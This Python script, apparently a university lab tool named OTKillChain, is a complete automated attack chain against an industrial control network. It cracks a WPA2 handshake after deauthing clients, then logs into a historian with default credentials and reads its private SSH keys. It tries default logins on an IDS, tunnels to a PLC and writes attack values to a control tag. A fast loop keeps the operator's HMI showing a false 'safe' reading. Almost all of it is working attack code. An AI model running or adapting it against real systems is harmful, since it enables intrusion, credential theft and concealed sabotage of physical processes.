#!/usr/bin/env python3
"""
ot_autopwn.py — OTKillChain Autonomous Attack Framework
INCS 4810 | BCIT | Isolated Lab Network Only
"""

import subprocess
import sys
import os
import io
import re
import socket
import threading
import time
from datetime import datetime


# ── Dependency bootstrap ──────────────────────────────────────────────────────
def _require(pkg, import_name=None):
    import importlib
    name = import_name or pkg
    try:
        return importlib.import_module(name)
    except ImportError:
        print(f"[*] Installing {pkg}...")
        subprocess.run([sys.executable, "-m", "pip", "install", pkg, "-q"], check=True)
        return importlib.import_module(name)

_require("rich")
_require("paramiko")
_require("pycomm3")

from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.rule import Rule
from rich.markup import escape
import paramiko

console = Console()


# ── Topology ──────────────────────────────────────────────────────────────────
TOPOLOGY = {
    "wifi": {
        "interface":    "wlan0",
        "ssid":         "LabNetwork",          # target SSID for auto-connect
        "wordlist":     "/usr/share/wordlists/rockyou.txt",
        "capture_file": "/tmp/autopwn_cap",
    },
    "historian": {
        "ip":       "10.10.10.20",
        "port":     22,
        "username": "admin",
        "password": "admin123",
    },
    "ids": {
        "ip":       "10.20.20.5",
        "port":     22,
        "username": "admin",
        "password": "admin123",
    },
    "plc": {
        "ip":            "10.20.20.111",
        "ot_subnet":     "10.20.20",           # /24 sweep prefix
        "freeze_tag":    "Pump_Speed_AO1",
        "freeze_value":  20,                   # "safe" value shown on HMI
        "attack_tag":    "HMI_Speed",
        "attack_value":  10,
    },
    "honeypot": {
        "ip": "10.10.10.50",
    },
}

LOCAL_CIP_PORT = 44818
CIP_SLOTS      = ["", "/0", "/1", "/2", "/3"]
OT_SCAN_PORTS  = [44818, 502, 102]
FREEZE_INTERVAL = 0.005   # 5 ms — beats a 10 ms PLC scan cycle


# ── Terminal helpers ──────────────────────────────────────────────────────────
BANNER = (
    "╔══════════════════════════════════════════════════════════════╗\n"
    "║   ██████╗ ████████╗    ██╗  ██╗██╗██╗     ██╗               ║\n"
    "║  ██╔═══██╗╚══██╔══╝    ██║ ██╔╝██║██║     ██║               ║\n"
    "║  ██║   ██║   ██║       █████╔╝ ██║██║     ██║               ║\n"
    "║  ██║   ██║   ██║       ██╔═██╗ ██║██║     ██║               ║\n"
    "║  ╚██████╔╝   ██║       ██║  ██╗██║███████╗███████╗          ║\n"
    "║   ╚═════╝    ╚═╝       ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝          ║\n"
    "║        C H A I N   —   A u t o n o m o u s   O T            ║\n"
    "╚══════════════════════════════════════════════════════════════╝"
)

def _banner():
    console.print(f"\n[bold red]{BANNER}[/bold red]\n")
    console.print(Panel(
        "[bold white]OTKillChain — Autonomous ICS/OT Attack Framework[/bold white]\n"
        "[dim]INCS 4810 | BCIT | Authorized lab use only[/dim]\n"
        "[bold yellow]All actions are confined to the isolated lab network.[/bold yellow]",
        border_style="red", expand=False,
    ))
    console.print()

def _step(module: str, msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    console.print(f"[dim]{ts}[/dim]  [bold cyan][{module}][/bold cyan]  [white]{msg}[/white]")

def _ok(module: str, msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    console.print(f"[dim]{ts}[/dim]  [bold cyan][{module}][/bold cyan]  [bold green][+][/bold green] [green]{msg}[/green]")

def _warn(module: str, msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    console.print(f"[dim]{ts}[/dim]  [bold cyan][{module}][/bold cyan]  [bold yellow][!][/bold yellow] [yellow]{msg}[/yellow]")

def _err(module: str, msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    console.print(f"[dim]{ts}[/dim]  [bold cyan][{module}][/bold cyan]  [bold red][-][/bold red] [red]{msg}[/red]")

def _section(title: str):
    console.print()
    console.rule(f"[bold cyan]{title}[/bold cyan]")
    console.print()


def _run(cmd: str, timeout: int = 90, capture: bool = True) -> tuple[int, str]:
    """Run a shell command, return (returncode, combined output)."""
    try:
        proc = subprocess.run(
            cmd, shell=True, timeout=timeout,
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            text=True,
        )
        return proc.returncode, proc.stdout
    except subprocess.TimeoutExpired:
        return -1, "TIMEOUT"


def _tcp_probe(ip: str, port: int, timeout: float = 2.0) -> bool:
    """Return True if TCP port is open."""
    try:
        with socket.create_connection((ip, port), timeout=timeout):
            return True
    except OSError:
        return False


# ── SSH helpers ───────────────────────────────────────────────────────────────
def _ssh_connect(ip: str, port: int, user: str, password: str | None = None,
                 pkey: paramiko.PKey | None = None) -> paramiko.SSHClient:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        hostname=ip, port=port, username=user,
        password=password, pkey=pkey,
        timeout=15, allow_agent=False, look_for_keys=False,
    )
    return client


def _ssh_hop(jump: paramiko.SSHClient, target_ip: str, target_port: int,
             target_user: str, target_pass: str | None = None,
             pkey: paramiko.PKey | None = None) -> paramiko.SSHClient:
    transport  = jump.get_transport()
    dest_addr  = (target_ip,  target_port)
    local_addr = (transport.getpeername()[0], 0)
    chan = transport.open_channel("direct-tcpip", dest_addr, local_addr)

    inner = paramiko.SSHClient()
    inner.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    inner.connect(
        target_ip, port=target_port, username=target_user,
        password=target_pass, pkey=pkey, sock=chan,
        timeout=15, allow_agent=False, look_for_keys=False,
    )
    return inner


def _ssh_run(client: paramiko.SSHClient, cmd: str, timeout: int = 30) -> tuple[str, str]:
    _, out_ch, err_ch = client.exec_command(cmd, timeout=timeout)
    return out_ch.read().decode(), err_ch.read().decode()


# ── CIP tunnel helper ─────────────────────────────────────────────────────────
def _open_cip_tunnel(hist_ip: str, hist_user: str, hist_pass: str,
                     ids_ip: str,  ids_user: str,  ids_pass: str,
                     ids_pkey: paramiko.PKey | None,
                     plc_ip: str,  local_port: int = LOCAL_CIP_PORT
                     ) -> tuple[subprocess.Popen, str | None]:
    key_file: str | None = None
    if ids_pkey:
        key_file = "/tmp/autopwn_ids_rsa"
        with open(key_file, "w") as kf:
            ids_pkey.write_private_key(kf)
        os.chmod(key_file, 0o600)

    _run(f"fuser -k {local_port}/tcp 2>/dev/null || true", capture=False)
    time.sleep(0.5)

    ssh_opts  = "-o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=no"
    proxy_cmd = (
        f"sshpass -p '{hist_pass}' ssh -W %h:%p {ssh_opts} {hist_user}@{hist_ip}"
    )
    fwd       = f"-N -L {local_port}:{plc_ip}:{local_port}"
    proxy_opt = f'-o "ProxyCommand={proxy_cmd}"'

    if key_file:
        cmd = f"ssh {fwd} {ssh_opts} {proxy_opt} -i {key_file} {ids_user}@{ids_ip}"
    else:
        cmd = (
            f"sshpass -p '{ids_pass}' ssh {fwd} {ssh_opts} {proxy_opt} "
            f"{ids_user}@{ids_ip}"
        )

    proc = subprocess.Popen(
        cmd, shell=True,
        stdout=subprocess.DEVNULL,
        stderr=subprocess.PIPE,
    )
    return proc, key_file


# ══════════════════════════════════════════════════════════════════════════════
class OTKillChain:
    """
    Stateful autonomous attack chain: Wi-Fi → Pivot → Recon → Execution.

    self.state holds all runtime artefacts discovered during the run so
    every module downstream can consume what the previous one produced.
    """

    def __init__(self):
        self.state: dict = {
            "wifi_pass":   None,   # cracked WPA2 passphrase
            "hist_client": None,   # live Historian paramiko.SSHClient
            "ssh_key":     None,   # stolen paramiko.PKey from Historian
            "ids_user":    None,   # effective IDS username
            "ids_pass":    None,   # effective IDS password (or "" for key auth)
            "ids_client":  None,   # live IDS paramiko.SSHClient
            "plc_ip":      None,   # discovered PLC IP
            "tunnel_proc": None,   # ssh -L subprocess.Popen
            "key_file":    None,   # /tmp/autopwn_ids_rsa path
            "plc_conn":    None,   # open pycomm3 LogixDriver
            "plc_lock":    None,   # threading.Lock for pycomm3
            "freeze_stop": None,   # threading.Event for stealth thread
        }

    # ── Utility ───────────────────────────────────────────────────────────────
    def _resolve_wordlist(self) -> str | None:
        cfg = TOPOLOGY["wifi"]["wordlist"]
        candidates = [
            cfg, cfg + ".gz",
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/wordlists/rockyou.txt.gz",
            "/opt/wordlists/rockyou.txt",
            os.path.expanduser("~/rockyou.txt"),
        ]
        for p in candidates:
            if os.path.exists(p):
                if p.endswith(".gz"):
                    extracted = p[:-3]
                    if not os.path.exists(extracted):
                        _run(f"sudo gunzip -k {p}")
                    return extracted if os.path.exists(extracted) else None
                return p
        return None

    def _cleanup(self):
        """Tear down all live resources on exit."""
        if self.state.get("freeze_stop"):
            self.state["freeze_stop"].set()
            time.sleep(0.1)
        if self.state.get("plc_conn"):
            try: self.state["plc_conn"].close()
            except Exception: pass
        if self.state.get("tunnel_proc") and self.state["tunnel_proc"].poll() is None:
            self.state["tunnel_proc"].terminate()
            _warn("CLEANUP", "SSH tunnel terminated")
        if self.state.get("key_file") and os.path.exists(self.state["key_file"]):
            os.remove(self.state["key_file"])
        for k in ("ids_client", "hist_client"):
            c = self.state.get(k)
            if c:
                try: c.close()
                except Exception: pass

    # =========================================================================
    # MODULE 1 — Initial Access (Wi-Fi)
    # =========================================================================
    def module_initial_access(self):
        _section("MODULE 1 — Initial Access  (Wi-Fi WPA2)")
        iface = TOPOLOGY["wifi"]["interface"]
        cap   = TOPOLOGY["wifi"]["capture_file"]
        ssid  = TOPOLOGY["wifi"]["ssid"]
        wl    = self._resolve_wordlist()

        if not wl:
            raise RuntimeError("rockyou.txt not found — place it at /usr/share/wordlists/")

        def _restore_managed():
            _step("WiFi", f"Restoring {iface} to managed mode...")
            _run(f"sudo ifconfig {iface} down",         capture=False)
            _run(f"sudo iwconfig {iface} mode managed", capture=False)
            _run(f"sudo ifconfig {iface} up",           capture=False)

        # ── Monitor mode ──────────────────────────────────────────────────────
        _step("WiFi", f"Enabling monitor mode on {iface}...")
        _run(f"sudo ifconfig {iface} down")
        _run(f"sudo iwconfig {iface} mode monitor")
        _run(f"sudo ifconfig {iface} up")

        # ── AP scan ───────────────────────────────────────────────────────────
        scan_tmp = "/tmp/autopwn_scan"
        _run(f"sudo rm -f {scan_tmp}*")
        _step("WiFi", "Scanning for access points — 15 s...")
        _run(f"sudo timeout 15 airodump-ng --output-format csv -w {scan_tmp} {iface} 2>/dev/null",
             timeout=20)

        # Find matching SSID
        csv_path = f"{scan_tmp}-01.csv"
        bssid    = None
        channel  = None
        try:
            with open(csv_path, errors="ignore") as f:
                in_ap = True
                for line in f:
                    line = line.strip()
                    if line.startswith("Station MAC"):
                        in_ap = False
                    if not in_ap or line.startswith("BSSID") or not line:
                        continue
                    parts = [p.strip() for p in line.split(",")]
                    if len(parts) < 14:
                        continue
                    if len(parts[0]) == 17 and parts[0].count(":") == 5:
                        found_ssid = parts[13].strip()
                        if ssid.lower() in found_ssid.lower() or found_ssid == ssid:
                            bssid   = parts[0]
                            channel = parts[3].strip()
                            break
        except FileNotFoundError:
            pass

        if not bssid:
            raise RuntimeError(
                f"AP '{ssid}' not found in scan results. "
                "Check TOPOLOGY['wifi']['ssid'] or move closer."
            )

        _ok("WiFi", f"Target found: {ssid}  ({bssid})  CH{channel}")

        # ── Capture + crack loop ───────────────────────────────────────────────
        try:
            console.print(Panel(
                f"[bold white]Interface :[/bold white] {iface}\n"
                f"[bold white]Target    :[/bold white] {ssid}  ({bssid})\n"
                f"[bold white]Channel   :[/bold white] {channel}\n"
                f"[bold white]Duration  :[/bold white] 60 s\n"
                f"[bold white]Deauth    :[/bold white] [green]auto — firing in 3 s[/green]",
                title="[bold cyan] Capturing Handshake [/bold cyan]",
                border_style="cyan", expand=False,
            ))

            _run(f"sudo rm -f {cap}*")

            deauth_proc = subprocess.Popen(
                f"sudo sh -c 'sleep 3 && aireplay-ng --deauth 20 -a {bssid} {iface}'",
                shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
            )
            try:
                _run(
                    f"sudo timeout 60 airodump-ng --bssid {bssid} -c {channel} "
                    f"-w {cap} {iface} 2>/dev/null",
                    timeout=75,
                )
            finally:
                if deauth_proc.poll() is None:
                    deauth_proc.terminate()

            cap_file = f"{cap}-01.cap"
            if not os.path.exists(cap_file):
                raise RuntimeError("No capture file produced — adapter may have lost monitor mode")

            _step("WiFi", "Running aircrack-ng...")
            rc, out = _run(f"sudo aircrack-ng {cap_file} -w {wl}", timeout=300)
            if "KEY FOUND" not in out:
                raise RuntimeError("aircrack-ng did not crack the handshake — try a larger wordlist")

            clean_out = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", out)
            match     = re.search(r"KEY FOUND!\s*\[\s*(.*?)\s*\]", clean_out)
            if not match:
                raise RuntimeError("KEY FOUND in output but regex could not extract password")

            found_password = match.group(1).strip()
            self.state["wifi_pass"] = found_password
            _ok("WiFi", f"Cracked!  passphrase = [bold]{found_password}[/bold]")

            # ── Auto-connect ──────────────────────────────────────────────────
            _restore_managed()
            _step("WiFi", f"Connecting to {ssid} via NetworkManager...")
            _run(f"sudo nmcli con delete '{ssid}' 2>/dev/null || true")
            _run(
                f"sudo nmcli con add type wifi ifname {iface} "
                f"con-name '{ssid}' ssid '{ssid}' -- "
                f"wifi-sec.key-mgmt wpa-psk wifi-sec.psk '{found_password}'"
            )
            _run(f"sudo nmcli con up '{ssid}'")
            _step("WiFi", "Waiting 5 s for DHCP lease...")
            time.sleep(5)
            _ok("WiFi", f"Connected to {ssid} — DHCP lease acquired")

        except Exception:
            _restore_managed()
            raise

    # =========================================================================
    # MODULE 2 — Pivot  (Historian SSH + IDS tunnel + SSH key theft)
    # =========================================================================
    def module_pivot(self):
        _section("MODULE 2 — Pivot  (Historian → IDS)")

        hist = TOPOLOGY["historian"]
        ids  = TOPOLOGY["ids"]

        # ── Connect to Historian ──────────────────────────────────────────────
        _step("PIVOT", f"SSH → Historian {hist['username']}@{hist['ip']}...")
        hist_client = _ssh_connect(hist["ip"], hist["port"], hist["username"], hist["password"])
        self.state["hist_client"] = hist_client
        _ok("PIVOT", "Historian session established")

        # ── SSH key hunt on Historian ─────────────────────────────────────────
        stolen_key: paramiko.PKey | None = None
        for key_path, key_cls in [
            ("~/.ssh/id_rsa",     paramiko.RSAKey),
            ("~/.ssh/id_ed25519", paramiko.Ed25519Key),
        ]:
            _step("PIVOT", f"Hunting for private key: {key_path}")
            out, _ = _ssh_run(hist_client, f"cat {key_path} 2>/dev/null")
            if "PRIVATE KEY" in out:
                try:
                    stolen_key = key_cls.from_private_key(io.StringIO(out))
                    self.state["ssh_key"] = stolen_key
                    _ok("PIVOT", f"[bold green]Stolen SSH key from {key_path}![/bold green]")
                    break
                except Exception as e:
                    _warn("PIVOT", f"Key parse failed ({e}) — trying next")

        # ── Hop to IDS ────────────────────────────────────────────────────────
        IDS_CREDS = [
            (ids["username"], ids["password"]),
            ("pi",      "raspberry"),
            ("pi",      "admin123"),
            ("student", "student"),
            ("admin",   "raspberry"),
        ]

        ids_client: paramiko.SSHClient | None = None

        if stolen_key:
            _step("PIVOT", f"Attempting IDS hop using stolen key → {ids['ip']}...")
            try:
                ids_client = _ssh_hop(hist_client, ids["ip"], ids["port"],
                                      ids["username"], pkey=stolen_key)
                self.state["ids_user"] = ids["username"]
                self.state["ids_pass"] = ""
                _ok("PIVOT", "IDS hop via stolen key — SUCCESS")
            except paramiko.AuthenticationException:
                _warn("PIVOT", "Stolen key rejected by IDS — falling back to credentials")

        if ids_client is None:
            for user, passwd in IDS_CREDS:
                _step("PIVOT", f"Trying IDS creds {user}:{passwd}")
                try:
                    ids_client = _ssh_hop(hist_client, ids["ip"], ids["port"],
                                          user, target_pass=passwd)
                    self.state["ids_user"] = user
                    self.state["ids_pass"] = passwd
                    _ok("PIVOT", f"IDS hop via password ({user}:{passwd}) — SUCCESS")
                    break
                except paramiko.AuthenticationException:
                    continue

        if ids_client is None:
            raise RuntimeError("All IDS authentication attempts failed")

        self.state["ids_client"] = ids_client
        _ok("PIVOT", f"Double-hop established: Kali → Historian → IDS ({ids['ip']})")

        # ── CIP tunnel Kali:44818 → IDS → PLC ────────────────────────────────
        plc_ip = TOPOLOGY["plc"]["ip"]
        _step("PIVOT", f"Opening ssh -L {LOCAL_CIP_PORT} → IDS → PLC ({plc_ip})...")
        tunnel_proc, key_file = _open_cip_tunnel(
            hist["ip"], hist["username"], hist["password"],
            ids["ip"],  self.state["ids_user"], self.state["ids_pass"],
            stolen_key, plc_ip, LOCAL_CIP_PORT,
        )
        self.state["tunnel_proc"] = tunnel_proc
        self.state["key_file"]    = key_file

        _step("PIVOT", "Waiting 4 s for tunnel to stabilise...")
        time.sleep(4)

        if tunnel_proc.poll() is not None:
            stderr_bytes = tunnel_proc.stderr.read(2048).decode(errors="replace").strip()
            raise RuntimeError(f"SSH tunnel died immediately:\n{stderr_bytes}")

        _ok("PIVOT", f"CIP tunnel live  127.0.0.1:{LOCAL_CIP_PORT} → {plc_ip}:44818")

    # =========================================================================
    # MODULE 3 — Recon  (Python socket sweep, OT subnet)
    # =========================================================================
    def module_recon(self):
        _section("MODULE 3 — Recon  (OT subnet sweep)")

        ids_client = self.state.get("ids_client")
        if not ids_client:
            raise RuntimeError("No IDS session — run module_pivot first")

        subnet_prefix = TOPOLOGY["plc"]["ot_subnet"]
        configured_ip = TOPOLOGY["plc"]["ip"]
        _step("RECON", f"Sweeping {subnet_prefix}.1–254 for ICS ports {OT_SCAN_PORTS}...")

        # Run the sweep from the IDS via the existing Paramiko hop
        # (native Python socket from Kali can't reach OT; we issue a remote bash sweep)
        sweep_cmd = (
            "for i in $(seq 1 254); do "
            f"for p in {' '.join(str(p) for p in OT_SCAN_PORTS)}; do "
            f"(echo >/dev/tcp/{subnet_prefix}.$i/$p) 2>/dev/null "
            f"&& echo OPEN {subnet_prefix}.$i $p; done; done"
        )
        _step("RECON", "Running remote OT port sweep from IDS (30 s)...")
        out, _ = _ssh_run(ids_client, f"bash -c '{sweep_cmd}'", timeout=45)

        # Parse results
        found: dict[str, list[int]] = {}  # ip → [open_ports]
        for line in out.splitlines():
            parts = line.split()
            if len(parts) == 3 and parts[0] == "OPEN":
                ip   = parts[1]
                port = int(parts[2])
                found.setdefault(ip, []).append(port)

        if not found:
            raise RuntimeError(
                f"No ICS devices found on {subnet_prefix}.0/24 — "
                "check OT cabling or firewall rules"
            )

        # Build display table
        tbl = Table(
            title="[bold magenta]Discovered OT Devices[/bold magenta]",
            show_header=True, header_style="bold cyan", border_style="dim",
        )
        tbl.add_column("IP Address",   style="yellow", width=18)
        tbl.add_column("Open Ports",   style="green",  width=20)
        tbl.add_column("Vendor Hint",  style="cyan",   width=28)

        VENDOR_MAP = {44818: "Allen-Bradley / EtherNet-IP",
                      502:   "Modbus/TCP",
                      102:   "Siemens S7 / ISO-TSAP"}

        for ip, ports in sorted(found.items()):
            vendor = next((VENDOR_MAP[p] for p in ports if p in VENDOR_MAP), "Unknown ICS")
            tbl.add_row(ip, ", ".join(str(p) for p in sorted(ports)), vendor)
        console.print(tbl)

        # Prefer the configured IP if it responded, else take the first result
        if configured_ip in found:
            plc_ip = configured_ip
            _ok("RECON", f"Configured PLC {configured_ip} confirmed online — keeping target")
        else:
            plc_ip = next(iter(found))
            _warn("RECON", f"Configured IP not in sweep — auto-targeting {plc_ip}")

        self.state["plc_ip"] = plc_ip
        _ok("RECON", f"PLC target locked: [bold]{plc_ip}[/bold]")

    # =========================================================================
    # MODULE 4 — Execution  (pycomm3 CIP Write + overclocked Stealth thread)
    # =========================================================================
    def module_execution(self):
        _section("MODULE 4 — Execution  (CIP Write + View Denial)")

        plc_ip   = self.state.get("plc_ip") or TOPOLOGY["plc"]["ip"]
        freeze_tag   = TOPOLOGY["plc"]["freeze_tag"]
        freeze_value = TOPOLOGY["plc"]["freeze_value"]
        attack_tag   = TOPOLOGY["plc"]["attack_tag"]
        attack_value = TOPOLOGY["plc"]["attack_value"]

        tunnel_proc = self.state.get("tunnel_proc")
        if not tunnel_proc or tunnel_proc.poll() is not None:
            raise RuntimeError("CIP tunnel is not running — run module_pivot first")

        from pycomm3 import LogixDriver

        # ── Slot hunt ─────────────────────────────────────────────────────────
        plc_conn    = None
        working_path = None
        for slot in CIP_SLOTS:
            path = f"127.0.0.1{slot}"
            _step("EXEC", f"Trying CIP path {path!r}...")
            drv = LogixDriver(path, init_info=False)
            try:
                drv.open()
                plc_conn     = drv
                working_path = path
                _ok("EXEC", f"PLC connected at {path!r}")
                break
            except Exception as slot_err:
                _warn("EXEC", f"  {path!r} → {slot_err}")
                try: drv.close()
                except Exception: pass

        if plc_conn is None:
            raise RuntimeError(
                f"All CIP paths failed — PLC {plc_ip} not reachable via tunnel"
            )

        self.state["plc_conn"] = plc_conn
        plc_lock = threading.Lock()
        self.state["plc_lock"] = plc_lock

        try:
            # ── Stealth thread — freeze HMI display tag ───────────────────────
            stop_freeze = threading.Event()
            self.state["freeze_stop"] = stop_freeze

            def _freeze_loop(ev=stop_freeze, lock=plc_lock):
                while not ev.is_set():
                    try:
                        with lock:
                            plc_conn.write((freeze_tag, freeze_value))
                    except Exception:
                        pass
                    time.sleep(FREEZE_INTERVAL)

            freeze_thread = threading.Thread(target=_freeze_loop, daemon=True)
            freeze_thread.start()

            console.print(Panel(
                f"[bold white]Frozen tag  :[/bold white] [bold yellow]{freeze_tag}[/bold yellow]\n"
                f"[bold white]Locked at   :[/bold white] [bold green]{freeze_value}[/bold green]\n"
                f"[bold white]Interval    :[/bold white] {int(FREEZE_INTERVAL * 1000)} ms  "
                f"[dim](Overclocked — beats 10 ms PLC scan cycle)[/dim]\n"
                f"[dim]HMI will always display {freeze_value} while we manipulate {attack_tag}[/dim]",
                title="[bold magenta] HMI STEALTH MODE ACTIVE [/bold magenta]",
                border_style="magenta", expand=False,
            ))

            # ── Attack write ──────────────────────────────────────────────────
            _step("EXEC", f"Reading current value of [bold]{attack_tag}[/bold]...")
            with plc_lock:
                before = plc_conn.read(attack_tag)

            before_val = before.value if before else "unknown"
            _step("EXEC", f"  Current: {before_val}")
            _step("EXEC", f"  Writing {attack_value} → {attack_tag}")

            with plc_lock:
                plc_conn.write((attack_tag, attack_value))
                after = plc_conn.read(attack_tag)

            after_val = after.value if after else "unknown"

            if str(after_val) == str(attack_value):
                _ok("EXEC", f"  CONFIRMED  {attack_tag}: {before_val} → [bold red]{after_val}[/bold red]")
            else:
                _warn("EXEC", f"  Write accepted but read-back = {after_val} (ladder logic may have clamped it)")

            console.print(Panel(
                f"[bold white]Attack tag  :[/bold white] {attack_tag}\n"
                f"[bold white]Before      :[/bold white] {before_val}\n"
                f"[bold white]After       :[/bold white] [bold red]{after_val}[/bold red]\n"
                f"[bold white]Freeze tag  :[/bold white] {freeze_tag} locked at {freeze_value}  "
                f"[dim](HMI blind)[/dim]",
                title="[bold red] ⚡ PAYLOAD DELIVERED [/bold red]",
                border_style="red", expand=False,
            ))

            # Keep the stealth thread alive for 10 s so the operator can observe
            _step("EXEC", "Holding stealth thread for 10 s — observe HMI now...")
            time.sleep(10)

        finally:
            stop_freeze.set()
            time.sleep(0.1)
            plc_conn.close()
            self.state["plc_conn"] = None
            _step("EXEC", "PLC connection closed, stealth thread stopped")

    # =========================================================================
    # Orchestrator
    # =========================================================================
    def run_killchain(self):
        _banner()

        console.print(Panel(
            "[bold white]Modules:[/bold white]\n"
            "  [cyan]1[/cyan]  Initial Access  — Wi-Fi WPA2 crack + auto-connect\n"
            "  [cyan]2[/cyan]  Pivot           — Historian SSH, key theft, IDS hop, CIP tunnel\n"
            "  [cyan]3[/cyan]  Recon           — OT subnet sweep, PLC discovery\n"
            "  [cyan]4[/cyan]  Execution       — CIP Write + overclocked View Denial thread",
            title="[bold cyan] OTKillChain — Run Plan [/bold cyan]",
            border_style="cyan", expand=False,
        ))
        console.print()

        modules = [
            ("Initial Access", self.module_initial_access),
            ("Pivot",          self.module_pivot),
            ("Recon",          self.module_recon),
            ("Execution",      self.module_execution),
        ]

        start_ts = datetime.now()
        try:
            for name, fn in modules:
                _step("CHAIN", f"Starting module: [bold]{name}[/bold]")
                fn()
                _ok("CHAIN", f"Module [bold]{name}[/bold] complete")
                console.print()
        except Exception as exc:
            _err("CHAIN", f"Kill chain aborted at module — {exc}")
        finally:
            self._cleanup()
            elapsed = (datetime.now() - start_ts).total_seconds()
            console.print()
            console.rule("[bold red]Kill Chain Complete[/bold red]")
            _step("CHAIN", f"Total elapsed: {elapsed:.1f} s")


# ── Entry point ───────────────────────────────────────────────────────────────
if __name__ == "__main__":
    chain = OTKillChain()
    chain.run_killchain()
